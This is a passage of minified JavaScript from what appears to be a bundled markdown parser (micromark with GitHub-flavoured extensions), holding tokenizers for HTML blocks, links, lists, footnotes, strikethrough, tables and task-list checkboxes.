c=s===47,l=o.toLowerCase();return!c&&!a&&Ri.includes(l)?(i=1,r.interrupt?t(s):E(s)):Li.includes(o.toLowerCase())?(i=6,c?(e.consume(s),_):r.interrupt?t(s):E(s)):(i=7,r.interrupt&&!r.parser.lazy[r.now().line]?n(s):a?v(s):y(s))}return s===45||Te(s)?(e.consume(s),o+=String.fromCharCode(s),g):n(s)}function _(i){return i===62?(e.consume(i),r.interrupt?t:E):n(i)}function v(t){return M(t)?(e.consume(t),v):T(t)}function y(t){return t===47?(e.consume(t),T):t===58||t===95||we(t)?(e.consume(t),b):M(t)?(e.consume(t),y):T(t)}function b(t){return t===45||t===46||t===58||t===95||Te(t)?(e.consume(t),b):x(t)}function x(t){return t===61?(e.consume(t),ee):M(t)?(e.consume(t),x):y(t)}function ee(t){return t===null||t===60||t===61||t===62||t===96?n(t):t===34||t===39?(e.consume(t),c=t,S):M(t)?(e.consume(t),ee):C(t)}function S(t){return t===c?(e.consume(t),c=null,w):t===null||A(t)?n(t):(e.consume(t),S)}function C(t){return t===null||t===34||t===39||t===47||t===60||t===61||t===62||t===96||j(t)?x(t):(e.consume(t),C)}function w(e){return e===47||e===62||M(e)?y(e):n(e)}function T(t){return t===62?(e.consume(t),te):n(t)}function te(t){return t===null||A(t)?E(t):M(t)?(e.consume(t),te):n(t)}function E(t){return t===45&&i===2?(e.consume(t),ae):t===60&&i===1?(e.consume(t),oe):t===62&&i===4?(e.consume(t),O):t===63&&i===3?(e.consume(t),D):t===93&&i===5?(e.consume(t),ce):A(t)&&(i===6||i===7)?(e.exit(`htmlFlowData`),e.check(zi,le,ne)(t)):t===null||A(t)?(e.exit(`htmlFlowData`),ne(t)):(e.consume(t),E)}function ne(t){return e.check(Bi,re,le)(t)}function re(t){return e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),ie}function ie(t){return t===null||A(t)?ne(t):(e.enter(`htmlFlowData`),E(t))}function ae(t){return t===45?(e.consume(t),D):E(t)}function oe(t){return t===47?(e.consume(t),o=``,se):E(t)}function se(t){if(t===62){let n=o.toLowerCase();return Ri.includes(n)?(e.consume(t),O):E(t)}return we(t)&&o.length<8?(e.consume(t),o+=String.fromCharCode(t),se):E(t)}function ce(t){return t===93?(e.consume(t),D):E(t)}function D(t){return t===62?(e.consume(t),O):t===45&&i===2?(e.consume(t),D):E(t)}function O(t){return t===null||A(t)?(e.exit(`htmlFlowData`),le(t)):(e.consume(t),O)}function le(n){return e.exit(`htmlFlow`),t(n)}}function Ui(e,t,n){let r=this;return i;function i(t){return A(t)?(e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),a):n(t)}function a(e){return r.parser.lazy[r.now().line]?n(e):t(e)}}function Wi(e,t,n){return r;function r(r){return e.enter(`lineEnding`),e.consume(r),e.exit(`lineEnding`),e.attempt(qr,t,n)}}var Gi={name:`htmlText`,tokenize:Ki};function Ki(e,t,n){let r=this,i,a,o;return s;function s(t){return e.enter(`htmlText`),e.enter(`htmlTextData`),e.consume(t),c}function c(t){return t===33?(e.consume(t),l):t===47?(e.consume(t),x):t===63?(e.consume(t),y):we(t)?(e.consume(t),C):n(t)}function l(t){return t===45?(e.consume(t),u):t===91?(e.consume(t),a=0,m):we(t)?(e.consume(t),v):n(t)}function u(t){return t===45?(e.consume(t),p):n(t)}function d(t){return t===null?n(t):t===45?(e.consume(t),f):A(t)?(o=d,oe(t)):(e.consume(t),d)}function f(t){return t===45?(e.consume(t),p):d(t)}function p(e){return e===62?ae(e):e===45?f(e):d(e)}function m(t){return t===`CDATA[`.charCodeAt(a++)?(e.consume(t),a===6?h:m):n(t)}function h(t){return t===null?n(t):t===93?(e.consume(t),g):A(t)?(o=h,oe(t)):(e.consume(t),h)}function g(t){return t===93?(e.consume(t),_):h(t)}function _(t){return t===62?ae(t):t===93?(e.consume(t),_):h(t)}function v(t){return t===null||t===62?ae(t):A(t)?(o=v,oe(t)):(e.consume(t),v)}function y(t){return t===null?n(t):t===63?(e.consume(t),b):A(t)?(o=y,oe(t)):(e.consume(t),y)}function b(e){return e===62?ae(e):y(e)}function x(t){return we(t)?(e.consume(t),ee):n(t)}function ee(t){return t===45||Te(t)?(e.consume(t),ee):S(t)}function S(t){return A(t)?(o=S,oe(t)):M(t)?(e.consume(t),S):ae(t)}function C(t){return t===45||Te(t)?(e.consume(t),C):t===47||t===62||j(t)?w(t):n(t)}function w(t){return t===47?(e.consume(t),ae):t===58||t===95||we(t)?(e.consume(t),T):A(t)?(o=w,oe(t)):M(t)?(e.consume(t),w):ae(t)}function T(t){return t===45||t===46||t===58||t===95||Te(t)?(e.consume(t),T):te(t)}function te(t){return t===61?(e.consume(t),E):A(t)?(o=te,oe(t)):M(t)?(e.consume(t),te):w(t)}function E(t){return t===null||t===60||t===61||t===62||t===96?n(t):t===34||t===39?(e.consume(t),i=t,ne):A(t)?(o=E,oe(t)):M(t)?(e.consume(t),E):(e.consume(t),re)}function ne(t){return t===i?(e.consume(t),i=void 0,ie):t===null?n(t):A(t)?(o=ne,oe(t)):(e.consume(t),ne)}function re(t){return t===null||t===34||t===39||t===60||t===61||t===96?n(t):t===47||t===62||j(t)?w(t):(e.consume(t),re)}function ie(e){return e===47||e===62||j(e)?w(e):n(e)}function ae(r){return r===62?(e.consume(r),e.exit(`htmlTextData`),e.exit(`htmlText`),t):n(r)}function oe(t){return e.exit(`htmlTextData`),e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),se}function se(t){return M(t)?P(e,ce,`linePrefix`,r.parser.constructs.disable.null.includes(`codeIndented`)?void 0:4)(t):ce(t)}function ce(t){return e.enter(`htmlTextData`),o(t)}}var qi={name:`labelEnd`,resolveAll:Zi,resolveTo:Qi,tokenize:$i},Ji={tokenize:ea},Yi={tokenize:ta},Xi={tokenize:na};function Zi(e){let t=-1,n=[];for(;++t<e.length;){let r=e[t][1];if(n.push(e[t]),r.type===`labelImage`||r.type===`labelLink`||r.type===`labelEnd`){let e=r.type===`labelImage`?4:2;r.type=`data`,t+=e}}return e.length!==n.length&&lr(e,0,e.length,n),e}function Qi(e,t){let n=e.length,r=0,i,a,o,s;for(;n--;)if(i=e[n][1],a){if(i.type===`link`||i.type===`labelLink`&&i._inactive)break;e[n][0]===`enter`&&i.type===`labelLink`&&(i._inactive=!0)}else if(o){if(e[n][0]===`enter`&&(i.type===`labelImage`||i.type===`labelLink`)&&!i._balanced&&(a=n,i.type!==`labelLink`)){r=2;break}}else i.type===`labelEnd`&&(o=n);let c={type:e[a][1].type===`labelLink`?`link`:`image`,start:{...e[a][1].start},end:{...e[e.length-1][1].end}},l={type:`label`,start:{...e[a][1].start},end:{...e[o][1].end}},u={type:`labelText`,start:{...e[a+r+2][1].end},end:{...e[o-2][1].start}};return s=[[`enter`,c,t],[`enter`,l,t]],s=ur(s,e.slice(a+1,a+r+3)),s=ur(s,[[`enter`,u,t]]),s=ur(s,Br(t.parser.constructs.insideSpan.null,e.slice(a+r+4,o-3),t)),s=ur(s,[[`exit`,u,t],e[o-2],e[o-1],[`exit`,l,t]]),s=ur(s,e.slice(o+1)),s=ur(s,[[`exit`,c,t]]),lr(e,a,e.length,s),e}function $i(e,t,n){let r=this,i=r.events.length,a,o;for(;i--;)if((r.events[i][1].type===`labelImage`||r.events[i][1].type===`labelLink`)&&!r.events[i][1]._balanced){a=r.events[i][1];break}return s;function s(t){return a?a._inactive?d(t):(o=r.parser.defined.includes(N(r.sliceSerialize({start:a.end,end:r.now()}))),e.enter(`labelEnd`),e.enter(`labelMarker`),e.consume(t),e.exit(`labelMarker`),e.exit(`labelEnd`),c):n(t)}function c(t){return t===40?e.attempt(Ji,u,o?u:d)(t):t===91?e.attempt(Yi,u,o?l:d)(t):o?u(t):d(t)}function l(t){return e.attempt(Xi,u,d)(t)}function u(e){return t(e)}function d(e){return a._balanced=!0,n(e)}}function ea(e,t,n){return r;function r(t){return e.enter(`resource`),e.enter(`resourceMarker`),e.consume(t),e.exit(`resourceMarker`),i}function i(t){return j(t)?Di(e,a)(t):a(t)}function a(t){return t===41?u(t):wi(e,o,s,`resourceDestination`,`resourceDestinationLiteral`,`resourceDestinationLiteralMarker`,`resourceDestinationRaw`,`resourceDestinationString`,32)(t)}function o(t){return j(t)?Di(e,c)(t):u(t)}function s(e){return n(e)}function c(t){return t===34||t===39||t===40?Ei(e,l,n,`resourceTitle`,`resourceTitleMarker`,`resourceTitleString`)(t):u(t)}function l(t){return j(t)?Di(e,u)(t):u(t)}function u(r){return r===41?(e.enter(`resourceMarker`),e.consume(r),e.exit(`resourceMarker`),e.exit(`resource`),t):n(r)}}function ta(e,t,n){let r=this;return i;function i(t){return Ti.call(r,e,a,o,`reference`,`referenceMarker`,`referenceString`)(t)}function a(e){return r.parser.defined.includes(N(r.sliceSerialize(r.events[r.events.length-1][1]).slice(1,-1)))?t(e):n(e)}function o(e){return n(e)}}function na(e,t,n){return r;function r(t){return e.enter(`reference`),e.enter(`referenceMarker`),e.consume(t),e.exit(`referenceMarker`),i}function i(r){return r===93?(e.enter(`referenceMarker`),e.consume(r),e.exit(`referenceMarker`),e.exit(`reference`),t):n(r)}}var ra={name:`labelStartImage`,resolveAll:qi.resolveAll,tokenize:ia};function ia(e,t,n){let r=this;return i;function i(t){return e.enter(`labelImage`),e.enter(`labelImageMarker`),e.consume(t),e.exit(`labelImageMarker`),a}function a(t){return t===91?(e.enter(`labelMarker`),e.consume(t),e.exit(`labelMarker`),e.exit(`labelImage`),o):n(t)}function o(e){return e===94&&`_hiddenFootnoteSupport`in r.parser.constructs?n(e):t(e)}}var aa={name:`labelStartLink`,resolveAll:qi.resolveAll,tokenize:oa};function oa(e,t,n){let r=this;return i;function i(t){return e.enter(`labelLink`),e.enter(`labelMarker`),e.consume(t),e.exit(`labelMarker`),e.exit(`labelLink`),a}function a(e){return e===94&&`_hiddenFootnoteSupport`in r.parser.constructs?n(e):t(e)}}var sa={name:`lineEnding`,tokenize:ca};function ca(e,t){return n;function n(n){return e.enter(`lineEnding`),e.consume(n),e.exit(`lineEnding`),P(e,t,`linePrefix`)}}var la={name:`thematicBreak`,tokenize:ua};function ua(e,t,n){let r=0,i;return a;function a(t){return e.enter(`thematicBreak`),o(t)}function o(e){return i=e,s(e)}function s(a){return a===i?(e.enter(`thematicBreakSequence`),c(a)):r>=3&&(a===null||A(a))?(e.exit(`thematicBreak`),t(a)):n(a)}function c(t){return t===i?(e.consume(t),r++,c):(e.exit(`thematicBreakSequence`),M(t)?P(e,s,`whitespace`)(t):s(t))}}var I={continuation:{tokenize:ma},exit:ga,name:`list`,tokenize:pa},da={partial:!0,tokenize:_a},fa={partial:!0,tokenize:ha};function pa(e,t,n){let r=this,i=r.events[r.events.length-1],a=i&&i[1].type===`linePrefix`?i[2].sliceSerialize(i[1],!0).length:0,o=0;return s;function s(t){let i=r.containerState.type||(t===42||t===43||t===45?`listUnordered`:`listOrdered`);if(i===`listUnordered`?!r.containerState.marker||t===r.containerState.marker:Oe(t)){if(r.containerState.type||(r.containerState.type=i,e.enter(i,{_container:!0})),i===`listUnordered`)return e.enter(`listItemPrefix`),t===42||t===45?e.check(la,n,l)(t):l(t);if(!r.interrupt||t===49)return e.enter(`listItemPrefix`),e.enter(`listItemValue`),c(t)}return n(t)}function c(t){return Oe(t)&&++o<10?(e.consume(t),c):(!r.interrupt||o<2)&&(r.containerState.marker?t===r.containerState.marker:t===41||t===46)?(e.exit(`listItemValue`),l(t)):n(t)}function l(t){return e.enter(`listItemMarker`),e.consume(t),e.exit(`listItemMarker`),r.containerState.marker=r.containerState.marker||t,e.check(qr,r.interrupt?n:u,e.attempt(da,f,d))}function u(e){return r.containerState.initialBlankLine=!0,a++,f(e)}function d(t){return M(t)?(e.enter(`listItemPrefixWhitespace`),e.consume(t),e.exit(`listItemPrefixWhitespace`),f):n(t)}function f(n){return r.containerState.size=a+r.sliceSerialize(e.exit(`listItemPrefix`),!0).length,t(n)}}function ma(e,t,n){let r=this;return r.containerState._closeFlow=void 0,e.check(qr,i,a);function i(n){return r.containerState.furtherBlankLines=r.containerState.furtherBlankLines||r.containerState.initialBlankLine,P(e,t,`listItemIndent`,r.containerState.size+1)(n)}function a(n){return r.containerState.furtherBlankLines||!M(n)?(r.containerState.furtherBlankLines=void 0,r.containerState.initialBlankLine=void 0,o(n)):(r.containerState.furtherBlankLines=void 0,r.containerState.initialBlankLine=void 0,e.attempt(fa,t,o)(n))}function o(i){return r.containerState._closeFlow=!0,r.interrupt=void 0,P(e,e.attempt(I,t,n),`linePrefix`,r.parser.constructs.disable.null.includes(`codeIndented`)?void 0:4)(i)}}function ha(e,t,n){let r=this;return P(e,i,`listItemIndent`,r.containerState.size+1);function i(e){let i=r.events[r.events.length-1];return i&&i[1].type===`listItemIndent`&&i[2].sliceSerialize(i[1],!0).length===r.containerState.size?t(e):n(e)}}function ga(e){e.exit(this.containerState.type)}function _a(e,t,n){let r=this;return P(e,i,`listItemPrefixWhitespace`,r.parser.constructs.disable.null.includes(`codeIndented`)?void 0:5);function i(e){let i=r.events[r.events.length-1];return!M(e)&&i&&i[1].type===`listItemPrefixWhitespace`?t(e):n(e)}}var va={name:`setextUnderline`,resolveTo:ya,tokenize:ba};function ya(e,t){let n=e.length,r,i,a;for(;n--;)if(e[n][0]===`enter`){if(e[n][1].type===`content`){r=n;break}e[n][1].type===`paragraph`&&(i=n)}else e[n][1].type===`content`&&e.splice(n,1),!a&&e[n][1].type===`definition`&&(a=n);let o={type:`setextHeading`,start:{...e[r][1].start},end:{...e[e.length-1][1].end}};return e[i][1].type=`setextHeadingText`,a?(e.splice(i,0,[`enter`,o,t]),e.splice(a+1,0,[`exit`,e[r][1],t]),e[r][1].end={...e[a][1].end}):e[r][1]=o,e.push([`exit`,o,t]),e}function ba(e,t,n){let r=this,i;return a;function a(t){let a=r.events.length,s;for(;a--;)if(r.events[a][1].type!==`lineEnding`&&r.events[a][1].type!==`linePrefix`&&r.events[a][1].type!==`content`){s=r.events[a][1].type===`paragraph`;break}return!r.parser.lazy[r.now().line]&&(r.interrupt||s)?(e.enter(`setextHeadingLine`),i=t,o(t)):n(t)}function o(t){return e.enter(`setextHeadingLineSequence`),s(t)}function s(t){return t===i?(e.consume(t),s):(e.exit(`setextHeadingLineSequence`),M(t)?P(e,c,`lineSuffix`)(t):c(t))}function c(r){return r===null||A(r)?(e.exit(`setextHeadingLine`),t(r)):n(r)}}var xa={tokenize:ka,partial:!0};function Sa(){return{document:{91:{name:`gfmFootnoteDefinition`,tokenize:Ea,continuation:{tokenize:Da},exit:Oa}},text:{91:{name:`gfmFootnoteCall`,tokenize:Ta},93:{name:`gfmPotentialFootnoteCall`,add:`after`,tokenize:Ca,resolveTo:wa}}}}function Ca(e,t,n){let r=this,i=r.events.length,a=r.parser.gfmFootnotes||(r.parser.gfmFootnotes=[]),o;for(;i--;){let e=r.events[i][1];if(e.type===`labelImage`){o=e;break}if(e.type===`gfmFootnoteCall`||e.type===`labelLink`||e.type===`label`||e.type===`image`||e.type===`link`)break}return s;function s(i){if(!o||!o._balanced)return n(i);let s=N(r.sliceSerialize({start:o.end,end:r.now()}));return s.codePointAt(0)!==94||!a.includes(s.slice(1))?n(i):(e.enter(`gfmFootnoteCallLabelMarker`),e.consume(i),e.exit(`gfmFootnoteCallLabelMarker`),t(i))}}function wa(e,t){let n=e.length;for(;n--;)if(e[n][1].type===`labelImage`&&e[n][0]===`enter`){e[n][1];break}e[n+1][1].type=`data`,e[n+3][1].type=`gfmFootnoteCallLabelMarker`;let r={type:`gfmFootnoteCall`,start:Object.assign({},e[n+3][1].start),end:Object.assign({},e[e.length-1][1].end)},i={type:`gfmFootnoteCallMarker`,start:Object.assign({},e[n+3][1].end),end:Object.assign({},e[n+3][1].end)};i.end.column++,i.end.offset++,i.end._bufferIndex++;let a={type:`gfmFootnoteCallString`,start:Object.assign({},i.end),end:Object.assign({},e[e.length-1][1].start)},o={type:`chunkString`,contentType:`string`,start:Object.assign({},a.start),end:Object.assign({},a.end)},s=[e[n+1],e[n+2],[`enter`,r,t],e[n+3],e[n+4],[`enter`,i,t],[`exit`,i,t],[`enter`,a,t],[`enter`,o,t],[`exit`,o,t],[`exit`,a,t],e[e.length-2],e[e.length-1],[`exit`,r,t]];return e.splice(n,e.length-n+1,...s),e}function Ta(e,t,n){let r=this,i=r.parser.gfmFootnotes||(r.parser.gfmFootnotes=[]),a=0,o;return s;function s(t){return e.enter(`gfmFootnoteCall`),e.enter(`gfmFootnoteCallLabelMarker`),e.consume(t),e.exit(`gfmFootnoteCallLabelMarker`),c}function c(t){return t===94?(e.enter(`gfmFootnoteCallMarker`),e.consume(t),e.exit(`gfmFootnoteCallMarker`),e.enter(`gfmFootnoteCallString`),e.enter(`chunkString`).contentType=`string`,l):n(t)}function l(s){if(a>999||s===93&&!o||s===null||s===91||j(s))return n(s);if(s===93){e.exit(`chunkString`);let a=e.exit(`gfmFootnoteCallString`);return i.includes(N(r.sliceSerialize(a)))?(e.enter(`gfmFootnoteCallLabelMarker`),e.consume(s),e.exit(`gfmFootnoteCallLabelMarker`),e.exit(`gfmFootnoteCall`),t):n(s)}return j(s)||(o=!0),a++,e.consume(s),s===92?u:l}function u(t){return t===91||t===92||t===93?(e.consume(t),a++,l):l(t)}}function Ea(e,t,n){let r=this,i=r.parser.gfmFootnotes||(r.parser.gfmFootnotes=[]),a,o=0,s;return c;function c(t){return e.enter(`gfmFootnoteDefinition`)._container=!0,e.enter(`gfmFootnoteDefinitionLabel`),e.enter(`gfmFootnoteDefinitionLabelMarker`),e.consume(t),e.exit(`gfmFootnoteDefinitionLabelMarker`),l}function l(t){return t===94?(e.enter(`gfmFootnoteDefinitionMarker`),e.consume(t),e.exit(`gfmFootnoteDefinitionMarker`),e.enter(`gfmFootnoteDefinitionLabelString`),e.enter(`chunkString`).contentType=`string`,u):n(t)}function u(t){if(o>999||t===93&&!s||t===null||t===91||j(t))return n(t);if(t===93){e.exit(`chunkString`);let n=e.exit(`gfmFootnoteDefinitionLabelString`);return a=N(r.sliceSerialize(n)),e.enter(`gfmFootnoteDefinitionLabelMarker`),e.consume(t),e.exit(`gfmFootnoteDefinitionLabelMarker`),e.exit(`gfmFootnoteDefinitionLabel`),f}return j(t)||(s=!0),o++,e.consume(t),t===92?d:u}function d(t){return t===91||t===92||t===93?(e.consume(t),o++,u):u(t)}function f(t){return t===58?(e.enter(`definitionMarker`),e.consume(t),e.exit(`definitionMarker`),i.includes(a)||i.push(a),P(e,p,`gfmFootnoteDefinitionWhitespace`)):n(t)}function p(e){return t(e)}}function Da(e,t,n){return e.check(qr,t,e.attempt(xa,t,n))}function Oa(e){e.exit(`gfmFootnoteDefinition`)}function ka(e,t,n){let r=this;return P(e,i,`gfmFootnoteDefinitionIndent`,5);function i(e){let i=r.events[r.events.length-1];return i&&i[1].type===`gfmFootnoteDefinitionIndent`&&i[2].sliceSerialize(i[1],!0).length===4?t(e):n(e)}}function Aa(e){let t=(e||{}).singleTilde,n={name:`strikethrough`,tokenize:i,resolveAll:r};return t??=!0,{text:{126:n},insideSpan:{null:[n]},attentionMarkers:{null:[126]}};function r(e,t){let n=-1;for(;++n<e.length;)if(e[n][0]===`enter`&&e[n][1].type===`strikethroughSequenceTemporary`&&e[n][1]._close){let r=n;for(;r--;)if(e[r][0]===`exit`&&e[r][1].type===`strikethroughSequenceTemporary`&&e[r][1]._open&&e[n][1].end.offset-e[n][1].start.offset===e[r][1].end.offset-e[r][1].start.offset){e[n][1].type=`strikethroughSequence`,e[r][1].type=`strikethroughSequence`;let i={type:`strikethrough`,start:Object.assign({},e[r][1].start),end:Object.assign({},e[n][1].end)},a={type:`strikethroughText`,start:Object.assign({},e[r][1].end),end:Object.assign({},e[n][1].start)},o=[[`enter`,i,t],[`enter`,e[r][1],t],[`exit`,e[r][1],t],[`enter`,a,t]],s=t.parser.constructs.insideSpan.null;s&&lr(o,o.length,0,Br(s,e.slice(r+1,n),t)),lr(o,o.length,0,[[`exit`,a,t],[`enter`,e[n][1],t],[`exit`,e[n][1],t],[`exit`,i,t]]),lr(e,r-1,n-r+3,o),n=r+o.length-2;break}}for(n=-1;++n<e.length;)e[n][1].type===`strikethroughSequenceTemporary`&&(e[n][1].type=`data`);return e}function i(e,n,r){let i=this.previous,a=this.events,o=0;return s;function s(t){return i===126&&a[a.length-1][1].type!==`characterEscape`?r(t):(e.enter(`strikethroughSequenceTemporary`),c(t))}function c(a){let s=Qt(i);if(a===126)return o>1?r(a):(e.consume(a),o++,c);if(o<2&&!t)return r(a);let l=e.exit(`strikethroughSequenceTemporary`),u=Qt(a);return l._open=!u||u===2&&!!s,l._close=!s||s===2&&!!u,n(a)}}}var ja=class{constructor(){this.map=[],this.index=new Map}add(e,t,n){Ma(this,e,t,n)}consume(e){if(this.map.sort(function(e,t){return e[0]-t[0]}),this.map.length===0)return;let t=this.map.length,n=[];for(;t>0;)--t,n.push(e.slice(this.map[t][0]+this.map[t][1]),this.map[t][2]),e.length=this.map[t][0];n.push(e.slice()),e.length=0;let r=n.pop();for(;r;){for(let t of r)e.push(t);r=n.pop()}this.map.length=0,this.index.clear()}};function Ma(e,t,n,r){if(n===0&&r.length===0)return;let i=e.index.get(t);if(i){i[1]+=n,i[2].push(...r);return}let a=[t,n,r];e.map.push(a),e.index.set(t,a)}function Na(e,t){let n=!1,r=[];for(;t<e.length;){let i=e[t];if(n){if(i[0]===`enter`)i[1].type===`tableContent`&&r.push(e[t+1][1].type===`tableDelimiterMarker`?`left`:`none`);else if(i[1].type===`tableContent`){if(e[t-1][1].type===`tableDelimiterMarker`){let e=r.length-1;r[e]=r[e]===`left`?`center`:`right`}}else if(i[1].type===`tableDelimiterRow`)break}else i[0]===`enter`&&i[1].type===`tableDelimiterRow`&&(n=!0);t+=1}return r}function Pa(){return{flow:{null:{name:`table`,tokenize:Fa,resolveAll:Ia}}}}function Fa(e,t,n){let r=this,i=0,a=0,o;return s;function s(e){let t=r.events.length-1;for(;t>-1;){let{type:e}=r.events[t][1];if(e===`lineEnding`||e===`linePrefix`)t--;else break}let i=t>-1?r.events[t][1].type:null,a=i===`tableHead`||i===`tableRow`?ee:c;return a===ee&&r.parser.lazy[r.now().line]?n(e):a(e)}function c(t){return e.enter(`tableHead`),e.enter(`tableRow`),l(t)}function l(e){return e===124?u(e):(o=!0,a+=1,u(e))}function u(t){return t===null?n(t):A(t)?a>1?(a=0,r.interrupt=!0,e.exit(`tableRow`),e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),p):n(t):M(t)?P(e,u,`whitespace`)(t):(a+=1,o&&(o=!1,i+=1),t===124?(e.enter(`tableCellDivider`),e.consume(t),e.exit(`tableCellDivider`),o=!0,u):(e.enter(`data`),d(t)))}function d(t){return t===null||t===124||j(t)?(e.exit(`data`),u(t)):(e.consume(t),t===92?f:d)}function f(t){return t===92||t===124?(e.consume(t),d):d(t)}function p(t){return r.interrupt=!1,r.parser.lazy[r.now().line]?n(t):(e.enter(`tableDelimiterRow`),o=!1,M(t)?P(e,m,`linePrefix`,r.parser.constructs.disable.null.includes(`codeIndented`)?void 0:4)(t):m(t))}function m(t){return t===45||t===58?g(t):t===124?(o=!0,e.enter(`tableCellDivider`),e.consume(t),e.exit(`tableCellDivider`),h):x(t)}function h(t){return M(t)?P(e,g,`whitespace`)(t):g(t)}function g(t){return t===58?(a+=1,o=!0,e.enter(`tableDelimiterMarker`),e.consume(t),e.exit(`tableDelimiterMarker`),_):t===45?(a+=1,_(t)):t===null||A(t)?b(t):x(t)}function _(t){return t===45?(e.enter(`tableDelimiterFiller`),v(t)):x(t)}function v(t){return t===45?(e.consume(t),v):t===58?(o=!0,e.exit(`tableDelimiterFiller`),e.enter(`tableDelimiterMarker`),e.consume(t),e.exit(`tableDelimiterMarker`),y):(e.exit(`tableDelimiterFiller`),y(t))}function y(t){return M(t)?P(e,b,`whitespace`)(t):b(t)}function b(n){return n===124?m(n):n===null||A(n)?!o||i!==a?x(n):(e.exit(`tableDelimiterRow`),e.exit(`tableHead`),t(n)):x(n)}function x(e){return n(e)}function ee(t){return e.enter(`tableRow`),S(t)}function S(n){return n===124?(e.enter(`tableCellDivider`),e.consume(n),e.exit(`tableCellDivider`),S):n===null||A(n)?(e.exit(`tableRow`),t(n)):M(n)?P(e,S,`whitespace`)(n):(e.enter(`data`),C(n))}function C(t){return t===null||t===124||j(t)?(e.exit(`data`),S(t)):(e.consume(t),t===92?w:C)}function w(t){return t===92||t===124?(e.consume(t),C):C(t)}}function Ia(e,t){let n=-1,r=!0,i=0,a=[0,0,0,0],o=[0,0,0,0],s=!1,c=0,l,u,d,f=new ja;for(;++n<e.length;){let p=e[n],m=p[1];p[0]===`enter`?m.type===`tableHead`?(s=!1,c!==0&&(Ra(f,t,c,l,u),u=void 0,c=0),l={type:`table`,start:Object.assign({},m.start),end:Object.assign({},m.end)},f.add(n,0,[[`enter`,l,t]])):m.type===`tableRow`||m.type===`tableDelimiterRow`?(r=!0,d=void 0,a=[0,0,0,0],o=[0,n+1,0,0],s&&(s=!1,u={type:`tableBody`,start:Object.assign({},m.start),end:Object.assign({},m.end)},f.add(n,0,[[`enter`,u,t]])),i=m.type===`tableDelimiterRow`?2:u?3:1):i&&(m.type===`data`||m.type===`tableDelimiterMarker`||m.type===`tableDelimiterFiller`)?(r=!1,o[2]===0&&(a[1]!==0&&(o[0]=o[1],d=La(f,t,a,i,void 0,d),a=[0,0,0,0]),o[2]=n)):m.type===`tableCellDivider`&&(r?r=!1:(a[1]!==0&&(o[0]=o[1],d=La(f,t,a,i,void 0,d)),a=o,o=[a[1],n,0,0])):m.type===`tableHead`?(s=!0,c=n):m.type===`tableRow`||m.type===`tableDelimiterRow`?(c=n,a[1]===0?o[1]!==0&&(d=La(f,t,o,i,n,d)):(o[0]=o[1],d=La(f,t,a,i,n,d)),i=0):i&&(m.type===`data`||m.type===`tableDelimiterMarker`||m.type===`tableDelimiterFiller`)&&(o[3]=n)}for(c!==0&&Ra(f,t,c,l,u),f.consume(t.events),n=-1;++n<t.events.length;){let e=t.events[n];e[0]===`enter`&&e[1].type===`table`&&(e[1]._align=Na(t.events,n))}return e}function La(e,t,n,r,i,a){let o=r===1?`tableHeader`:r===2?`tableDelimiter`:`tableData`;n[0]!==0&&(a.end=Object.assign({},za(t.events,n[0])),e.add(n[0],0,[[`exit`,a,t]]));let s=za(t.events,n[1]);if(a={type:o,start:Object.assign({},s),end:Object.assign({},s)},e.add(n[1],0,[[`enter`,a,t]]),n[2]!==0){let i=za(t.events,n[2]),a=za(t.events,n[3]),o={type:`tableContent`,start:Object.assign({},i),end:Object.assign({},a)};if(e.add(n[2],0,[[`enter`,o,t]]),r!==2){let r=t.events[n[2]],i=t.events[n[3]];if(r[1].end=Object.assign({},i[1].end),r[1].type=`chunkText`,r[1].contentType=`text`,n[3]>n[2]+1){let t=n[2]+1,r=n[3]-n[2]-1;e.add(t,r,[])}}e.add(n[3]+1,0,[[`exit`,o,t]])}return i!==void 0&&(a.end=Object.assign({},za(t.events,i)),e.add(i,0,[[`exit`,a,t]]),a=void 0),a}function Ra(e,t,n,r,i){let a=[],o=za(t.events,n);i&&(i.end=Object.assign({},o),a.push([`exit`,i,t])),r.end=Object.assign({},o),a.push([`exit`,r,t]),e.add(n+1,0,a)}function za(e,t){let n=e[t],r=n[0]===`enter`?`start`:`end`;return n[1][r]}var Ba={name:`tasklistCheck`,tokenize:Ha};function Va(){return{text:{91:Ba}}}function Ha(e,t,n){let r=this;return i;function i(t){return r.previous!==null||!r._gfmTasklistFirstContentOfListItem?n(t):(e.enter(`taskListCheck`),e.enter(`taskListCheckMarker`),e.consume(t),e.exit(`taskListCheckMarker`),a)}function a(t){return j(t)?(e.enter(`taskListCheckValueUnchecked`),e.consume(t),e.exit(`taskListCheckValueUnchecked`),o):t===88||t===120?(e.enter(`taskListCheckValueChecked`),e.consume(t),e.exit(`taskListCheckValueChecked`),o):n(t)}function o(t){return t===93?(e.enter(`taskListCheckMarker`),e.consume(t),e.exit(`taskListCheckMarker`),e.exit(`taskListCheck`),s):n(t)}function s(r){return A(r)?t(r):M(r)?e.check({tokenize:Ua},t,n)(r):n(r)}}function Ua(e,t,n){return P(e,r,`whitespace`);function r(e){return e===null?n(e):t(e)}}function Wa(e){return fr([wr(),Sa(),Aa(e),Pa(),Va()])}var Ga={};function Ka(e){let t=this,n=e||Ga,r=t.data(),i=r.micromarkExtensions||=[],a=r.fromMarkdownExtensions||=[],o=r.toMarkdownExtensions||=[];i.push(Wa(n)),a.push(sr()),o.push(cr(n))}function qa(e,t){let n=t||{};return(e[e.length-1]===``?[...e,``]:e).join((n.padRight?` `:``)+`,`+(n.padLeft===!1?``:` `)).trim()}var Ja=/^[$_\p{ID_Start}][$_\u{200C}\u{200D}\p{ID_Continue}]*$/u,Ya=/^[$_\p{ID_Start}][-$_\u{200C}\u{200D}\p{ID_Continue}]*$/u,Xa={};function Za(e,t){return((t||Xa).jsx?Ya:Ja).test(e)}var Qa=/[ \t\n\f\r]/g;function $a(e){return typeof e==`object`?e.type===`text`&&eo(e.value):eo(e)}function eo(e){return e.replace(Qa,``)===``}var to=class{constructor(e,t,n){this.normal=t,this.property=e,n&&(this.space=n)}};to.prototype.normal={},to.prototype.property={},to.prototype.space=void 0;function no(e,t){let n={},r={};for(let t of e)Object.assign(n,t.property),Object.assign(r,t.normal);return new to(n,r,t)}function ro(e){return e.toLowerCase()}var 